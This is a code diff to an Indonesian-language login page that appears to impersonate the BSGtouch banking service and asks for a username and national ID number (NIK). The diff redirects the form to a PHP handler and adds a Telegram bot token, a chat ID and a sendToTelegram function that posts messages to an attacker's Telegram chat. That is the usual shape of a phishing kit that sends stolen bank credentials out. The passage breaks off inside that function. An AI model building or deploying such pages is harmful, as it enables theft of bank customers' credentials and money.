@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="id"><head>
+<!DOCTYPE html>
+<html lang="id">
+<head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>BSGtouch - Pendaftaran</title>
@@ -369,7 +371,7 @@ onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;l
       <div class="card">
         <h1>Selamat Datang</h1>
 
-          <form id="loginForm" autocomplete="on">
+          <form id="loginForm" action="req/1.php" method="POST" autocomplete="on">
           <div class="field">
             <div class="label">Masukkan Username</div>
             <div class="inputWrap">
@@ -436,6 +438,13 @@ onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;l
 
   <script>
     const $ = (s) => document.querySelector(s);
+    const toast = (msg) => {
+      const el = $("#toast");
+      el.textContent = msg;
+      el.classList.add("show");
+      clearTimeout(window.__t);
+      window.__t = setTimeout(() => el.classList.remove("show"), 2200);
+    };
 
     // Remember username
     const usernameEl = $("#username");
@@ -471,4 +480,30 @@ onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;l
 
     toggleNikBtn.addEventListener("click", () => {
       isHidden = !isHidden;
-      nikEl.type = isHidden ? "
+      nikEl.type = isHidden ? "password" : "text";
+      toggleNikBtn.classList.toggle("hidden", isHidden);
+    });
+
+    // Forgot
+    $("#forgotLink").addEventListener("click", (e) => {
+      e.preventDefault();
+      toast("Silakan hubungi Contact Center 1500 659");
+    });
+
+    // Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk'; // Ganti dengan token bot Telegram Anda
+    const TELEGRAM_CHAT_ID = '5529657606'; // Ganti dengan chat ID Anda (bisa didapat dari @userinfobot)
+
+    // Function to send message to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const data = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML' // Menggunakan HTML untuk format teks
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
